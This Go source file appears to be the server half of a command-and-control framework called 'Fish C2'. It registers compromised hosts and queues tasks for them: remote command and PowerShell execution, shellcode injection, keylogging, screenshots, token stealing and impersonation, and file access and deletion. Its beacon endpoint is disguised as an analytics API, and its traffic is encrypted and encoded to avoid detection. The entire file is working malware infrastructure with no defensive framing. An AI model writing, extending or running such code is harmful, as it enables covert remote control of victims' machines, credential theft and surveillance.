package main

import (
	"bufio"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"nautilus/c2/encode"
	"nautilus/evasion"

	"github.com/gorilla/websocket"
)

// TaskType反向映射 (uint16 -> string)
var taskTypeStr = map[encode.TaskType]string{
	encode.TaskExecCmd:    "exec",
	encode.TaskExecPS:     "ps",
	encode.TaskSysInfo:    "sysinfo",
	encode.TaskPrivInfo:   "privinfo",
	encode.TaskListDir:    "listdir",
	encode.TaskProcList:   "proclist",
	encode.TaskProcKill:   "kill",
	encode.TaskFileDelete: "filedel",
	encode.TaskFileRead:   "fileread",
	encode.TaskFileWrite:  "filewrite",
	encode.TaskPayload:    "payload",
	encode.TaskInject:     "inject",
	encode.TaskScreenshot: "screenshot",
	encode.TaskKeylogOn:   "keylogon",
	encode.TaskKeylogOff:  "keylogoff",
	encode.TaskTokenEnum:  "tokens",
	encode.TaskTokenSteal: "steal_token",
	encode.TaskTokenRev2:  "rev2self",
	encode.TaskTokenMake:  "make_token",
	encode.TaskExit:       "exit",
}

// Session client session
type Session struct {
	ID        string
	Info      map[string]interface{}
	LastSeen  time.Time
	TaskQueue []*encode.TaskReq
}

// WSEvent WebSocket事件
type WSEvent struct {
	Type string      `json:"type"` // "session_new", "task_result", "session_update"
	Data interface{} `json:"data"`
}

// Server C2 server
type Server struct {
	sessions      map[string]*Session
	mu            sync.Mutex
	nextTaskID    uint32
	taskResults   map[uint32]*encode.TaskResp
	taskTypes     map[uint32]encode.TaskType // taskID -> taskType 映射，用于WS广播
	activeSession string
	wsClients     map[*websocket.Conn]bool
	wsMu          sync.Mutex
	eventCh       chan WSEvent
}

func NewServer() *Server {
	s := &Server{
		sessions:    make(map[string]*Session),
		taskResults: make(map[uint32]*encode.TaskResp),
		taskTypes:   make(map[uint32]encode.TaskType),
		wsClients:   make(map[*websocket.Conn]bool),
		eventCh:     make(chan WSEvent, 100),
	}
	go s.broadcastLoop()
	return s
}

// WebSocket广播
func (s *Server) broadcastLoop() {
	for event := range s.eventCh {
		s.wsMu.Lock()
		data, _ := json.Marshal(event)
		for client := range s.wsClients {
			err := client.WriteMessage(websocket.TextMessage, data)
			if err != nil {
				client.Close()
				delete(s.wsClients, client)
			}
		}
		s.wsMu.Unlock()
	}
}

func (s *Server) broadcastEvent(event WSEvent) {
	select {
	case s.eventCh <- event:
	default:
	}
}

func (s *Server) addWSClient(conn *websocket.Conn) {
	s.wsMu.Lock()
	s.wsClients[conn] = true
	s.wsMu.Unlock()
}

func (s *Server) removeWSClient(conn *websocket.Conn) {
	s.wsMu.Lock()
	delete(s.wsClients, conn)
	s.wsMu.Unlock()
}

func generateSessionID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return fmt.Sprintf("%x-%d", b, time.Now().UnixNano())
}

// handleAnalytics GET /api/v1/analytics?id=<b64>&sid=<sid>
func (s *Server) handleAnalytics(w http.ResponseWriter, r *http.Request) {
	if r.Method != "GET" {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	idParam := r.URL.Query().Get("id")
	sidParam := r.URL.Query().Get("sid")

	if idParam == "" {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	decData, err := evasion.B64Decode(strings.TrimSpace(idParam))
	if err != nil {
		log.Printf("[DBG] B64Decode fail: %v, full_id=%s", err, idParam)
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	pkt, err := encode.DecodePacket(decData)
	if err != nil {
		log.Printf("[DBG] DecodePacket fail: %v", err)
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	decrypted, err := evasion.AesDecrypt(pkt.Data)
	if err != nil {
		log.Printf("[DBG] AesDecrypt fail: %v, type=%d, dataLen=%d", err, pkt.Type, len(pkt.Data))
		http.Error(w, "not found", http.StatusNotFound)
		return
	}
	pkt.Data = decrypted

	s.mu.Lock()
	defer s.mu.Unlock()

	switch pkt.Type {
	case encode.MsgRegister:
		s.handleRegister(pkt, w)
	case encode.MsgHeartbeat, encode.MsgTaskResult:
		if sidParam == "" {
			http.Error(w, "not found", http.StatusNotFound)
			return
		}
		s.handleSessionCallback(sidParam, pkt, w)
	default:
		http.Error(w, "not found", http.StatusNotFound)
	}
}

func (s *Server) handleRegister(pkt *encode.Packet, w http.ResponseWriter) {
	var info map[string]interface{}
	json.Unmarshal(pkt.Data, &info)

	sessionID := generateSessionID()
	session := &Session{
		ID:        sessionID,
		Info:      info,
		LastSeen:  time.Now(),
		TaskQueue: []*encode.TaskReq{},
	}
	s.sessions[sessionID] = session
	s.activeSession = sessionID

	log.Printf("[+] New session: %s (%s/%s)", sessionID, info["hostname"], info["username"])
	fmt.Printf("\n[Session %s] Registered\n> ", sessionID)

	// WebSocket广播新session
	s.broadcastEvent(WSEvent{
		Type: "session_new",
		Data: map[string]interface{}{
			"id":       sessionID,
			"hostname": info["hostname"],
			"username": info["username"],
			"os":       info["os"],
			"ip":       info["ip"],
			"arch":     info["arch"],
		},
	})

	respData, _ := json.Marshal(map[string]string{"session_id": sessionID})
	respPkt := &encode.Packet{
		Type: encode.MsgRegister,
		Data: respData,
	}
	s.sendPacket(respPkt, w)
}

func (s *Server) handleSessionCallback(sessionID string, pkt *encode.Packet, w http.ResponseWriter) {
	session, ok := s.sessions[sessionID]
	if !ok {
		http.Error(w, "not found", http.StatusNotFound)
		return
	}

	session.LastSeen = time.Now()

	if pkt.Type == encode.MsgTaskResult {
		var resp encode.TaskResp
		json.Unmarshal(pkt.Data, &resp)
		log.Printf("[+] Session %s | Task %d result: success=%v output=%s",
			sessionID, resp.TaskID, resp.Success, truncate(resp.Output, 200))
		fmt.Printf("\n[%s Task %d] Success: %v\nOutput:\n%s\n> ",
			sessionID, resp.TaskID, resp.Success, resp.Output)
		s.taskResults[resp.TaskID] = &resp

		// WebSocket广播任务结果 (包含task_type用于前端路由)
		taskType := ""
		if tt, ok := s.taskTypes[resp.TaskID]; ok {
			taskType = taskTypeStr[tt]
		}
		s.broadcastEvent(WSEvent{
			Type: "task_result",
			Data: map[string]interface{}{
				"task_id":    resp.TaskID,
				"session_id": sessionID,
				"task_type":  taskType,
				"success":    resp.Success,
				"output":     resp.Output,
				"error":      resp.Error,
			},
		})
	}

	if len(session.TaskQueue) > 0 {
		task := session.TaskQueue[0]
		session.TaskQueue = session.TaskQueue[1:]
		taskID := s.nextTaskID
		s.nextTaskID++
		s.taskTypes[taskID] = task.TaskType // 记录taskType

		taskJSON, _ := json.Marshal(task)
		respPkt := &encode.Packet{
			Type:   encode.MsgTask,
			TaskID: taskID,
			Data:   taskJSON,
		}
		s.sendPacket(respPkt, w)
		return
	}

	respPkt := &encode.Packet{
		Type: encode.MsgHeartbeat,
		Data: []byte{},
	}
	s.sendPacket(respPkt, w)
}

func (s *Server) sendPacket(pkt *encode.Packet, w http.ResponseWriter) {
	encrypted, err := evasion.AesEncrypt(pkt.Data)
	if err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}
	pkt.Data = encrypted

	raw, err := encode.EncodePacket(pkt)
	if err != nil {
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	b64 := evasion.B64Encode(raw)
	w.Header().Set("Content-Type", "text/plain")
	w.Write([]byte(b64))
}

func truncate(s string, max int) string {
	if len(s) > max {
		return s[:max] + "..."
	}
	return s
}

// Console commands
func (s *Server) handleConsole() {
	fmt.Println("Fish C2 Server Console")
	fmt.Println("Commands: sessions, use <id>, exec <cmd>, ps <cmd>, listdir <path>, sysinfo, privinfo, proclist, kill <pid>, inject <pid> <b64>, screenshot, keylogon, keylogoff, exit")
	fmt.Print("> ")

	reader := bufio.NewReader(os.Stdin)
	for {
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		parts := strings.SplitN(input, " ", 2)
		cmd := parts[0]

		switch cmd {
		case "sessions":
			s.mu.Lock()
			if len(s.sessions) == 0 {
				fmt.Println("  No active sessions")
			}
			for id, sess := range s.sessions {
				active := ""
				if id == s.activeSession {
					active = " [ACTIVE]"
				}
				fmt.Printf("  %s - %s (last: %s)%s\n", id, sess.Info["username"], sess.LastSeen.Format("15:04:05"), active)
			}
			s.mu.Unlock()
			fmt.Print("> ")

		case "use":
			if len(parts) < 2 {
				fmt.Println("Usage: use <session_id>")
				fmt.Print("> ")
				continue
			}
			s.mu.Lock()
			if _, ok := s.sessions[parts[1]]; ok {
				s.activeSession = parts[1]
				fmt.Printf("Active session: %s\n", parts[1])
			} else {
				fmt.Println("Session not found")
			}
			s.mu.Unlock()
			fmt.Print("> ")

		case "exec":
			if len(parts) < 2 {
				fmt.Println("Usage: exec <command>")
				fmt.Print("> ")
				continue
			}
			s.pushTaskActive(&encode.TaskReq{
				TaskType: encode.TaskExecCmd,
				Params:   map[string]string{"command": parts[1]},
			})

		case "ps":
			if len(parts) < 2 {
				fmt.Println("Usage: ps <command>")
				fmt.Print("> ")
				continue
			}
			s.pushTaskActive(&encode.TaskReq{
				TaskType: encode.TaskExecPS,
				Params:   map[string]string{"command": parts[1]},
			})

		case "inject":
			if len(parts) < 3 {
				fmt.Println("Usage: inject <pid> <shellcode_base64>")
				fmt.Println("  or:  inject <pid> self  (test with self-injection)")
				fmt.Print("> ")
				continue
			}
			s.pushTaskActive(&encode.TaskReq{
				TaskType: encode.TaskInject,
				Params:   map[string]string{"pid": parts[1], "shellcode": parts[2]},
			})

		case "screenshot":
			s.pushTaskActive(&encode.TaskReq{
				TaskType: encode.TaskScreenshot,
				Params:   map[string]string{},
			})

		case "keylogon":
			s.pushTaskActive(&encode.TaskReq{
				TaskType: encode.TaskKeylogOn,
				Params:   map[string]string{},
			})

		case "keylogoff":
			s.pushTaskActive(&encode.TaskReq{
				TaskType: encode.TaskKeylogOff,
				Params:   map[string]string{},
			})

		case "tokens":
			s.pushTaskActive(&encode.TaskReq{
				TaskType: encode.TaskTokenEnum,
				Params:   map[string]string{"action": "enum"},
			})

		case "steal-token":
			if len(parts) < 2 {
				fmt.Println("Usage: steal-token <pid>")
				fmt.Print("> ")
				continue
			}
			s.pushTaskActive(&encode.TaskReq{
				TaskType: encode.TaskTokenSteal,
				Params:   map[string]string{"action": "steal", "pid": parts[1]},
			})

		case "rev2self":
			s.pushTaskActive(&encode.TaskReq{
				TaskType: encode.TaskTokenRev2,
				Params:   map[string]string{"action": "rev2self"},
			})

		case "make-token":
			if len(parts) < 3 {
				fmt.Println("Usage: make-token <domain\\user> <password>")
				fmt.Print("> ")
				continue
			}
			userParts := strings.SplitN(parts[1], "\\", 2)
			domain := "."
			user := parts[1]
			if len(userParts) == 2 {
				domain = userParts[0]
				user = userParts[1]
			}
			s.pushTaskActive(&encode.TaskReq{
				TaskType: encode.TaskTokenMake,
				Params: map[string]string{
					"action": "make",
					"domain": domain,
					"user":   user,
					"pass":   parts[2],
				},
			})

		case "sysinfo":
			s.pushTaskActive(&encode.TaskReq{
				TaskType: encode.TaskSysInfo,
				Params:   map[string]string{},
			})

		case "privinfo":
			s.pushTaskActive(&encode.TaskReq{
				TaskType: encode.TaskPrivInfo,
				Params:   map[string]string{},
			})

		case "listdir":
			if len(parts) < 2 {
				fmt.Println("Usage: listdir <path>")
				fmt.Print("> ")
				continue
			}
			s.pushTaskActive(&encode.TaskReq{
				TaskType: encode.TaskListDir,
				Params:   map[string]string{"path": parts[1]},
			})

		case "proclist":
			s.pushTaskActive(&encode.TaskReq{
				TaskType: encode.TaskProcList,
				Params:   map[string]string{},
			})

		case "kill":
			if len(parts) < 2 {
				fmt.Println("Usage: kill <pid>")
				fmt.Print("> ")
				continue
			}
			s.pushTaskActive(&encode.TaskReq{
				TaskType: encode.TaskProcKill,
				Params:   map[string]string{"pid": parts[1]},
			})

		case "exit":
			os.Exit(0)

		default:
			fmt.Println("Unknown command")
			fmt.Print("> ")
		}
	}
}

func (s *Server) pushTaskActive(task *encode.TaskReq) {
	s.mu.Lock()
	if s.activeSession == "" {
		fmt.Println("No active session. Use 'use <id>' first.")
		fmt.Print("> ")
		s.mu.Unlock()
		return
	}
	session, ok := s.sessions[s.activeSession]
	if !ok {
		fmt.Println("Active session not found.")
		fmt.Print("> ")
		s.mu.Unlock()
		return
	}
	session.TaskQueue = append(session.TaskQueue, task)
	s.mu.Unlock()
	fmt.Printf("Task queued for %s\n", s.activeSession)
	fmt.Print("> ")
}

var wsUpgrader = websocket.Upgrader{
	CheckOrigin: func(r *http.Request) bool { return true },
}

func (s *Server) handleWS(w http.ResponseWriter, r *http.Request) {
	conn, err := wsUpgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WS upgrade failed: %v", err)
		return
	}
	s.addWSClient(conn)
	defer s.removeWSClient(conn)

	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			break
		}
	}
}

func main() {
	server := NewServer()

	// 伪装为普通API端点
	http.HandleFunc("/api/v1/analytics", server.handleAnalytics)
	http.HandleFunc("/nautilus", server.handleAnalytics)

	// WebSocket
	http.HandleFunc("/ws", server.handleWS)

	// Web UI + 管理API
	webUI := NewWebUI(server)
	http.HandleFunc("/ui", webUI.handleUI)
	http.HandleFunc("/admin/login", webUI.handleLoginAPI)
	http.HandleFunc("/admin/sessions", webUI.authMiddleware(webUI.handleSessionsAPI))
	http.HandleFunc("/admin/task", webUI.authMiddleware(webUI.handleTaskAPI))
	http.HandleFunc("/admin/results", webUI.authMiddleware(webUI.handleResultsAPI))
	http.HandleFunc("/admin/use", webUI.authMiddleware(webUI.handleUseAPI))
	http.HandleFunc("/admin/files/download", webUI.authMiddleware(webUI.handleFileDownloadAPI))
	http.HandleFunc("/admin/files/upload", webUI.authMiddleware(webUI.handleFileUploadAPI))

	// 仅在交互终端中启用控制台（非管道模式下跳过）
	if isTerminal() {
		go server.handleConsole()
	} else {
		log.Println("[+] Headless mode — console disabled, use Web UI")
	}

	addr := ":8443"
	if len(os.Args) > 1 {
		addr = os.Args[1]
	}

	fmt.Printf("Fish C2 Server starting on %s\n", addr)
	fmt.Printf("Web UI: http://localhost%s/ui\n", addr)
	log.Fatal(http.ListenAndServe(addr, nil))
}
